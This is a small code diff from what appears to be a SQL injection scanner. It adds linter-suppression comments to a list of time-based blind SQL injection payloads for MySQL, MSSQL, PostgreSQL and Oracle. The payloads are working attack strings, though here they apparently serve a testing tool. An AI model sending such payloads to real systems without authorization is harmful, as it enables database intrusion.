@@ -63,8 +63,8 @@ BOOLEAN_PAYLOADS: Final[tuple[tuple[str, str], ...]] = (
 SLEEP_TIME: Final[int] = 5
 
 TIME_PAYLOADS: Final[tuple[str, ...]] = (
-    f"' AND (SELECT * FROM (SELECT(SLEEP({SLEEP_TIME})))a)--",
-    f"'; WAITFOR DELAY '0:0:{SLEEP_TIME}'--",
+    f"' AND (SELECT * FROM (SELECT(SLEEP({SLEEP_TIME})))a)--",  # nosec B608
+    f"'; WAITFOR DELAY '0:0:{SLEEP_TIME}'--",  # nosec B608
     f"1' AND pg_sleep({SLEEP_TIME})--",
     f"1' AND DBMS_PIPE.RECEIVE_MESSAGE('a',{SLEEP_TIME})--",
 )
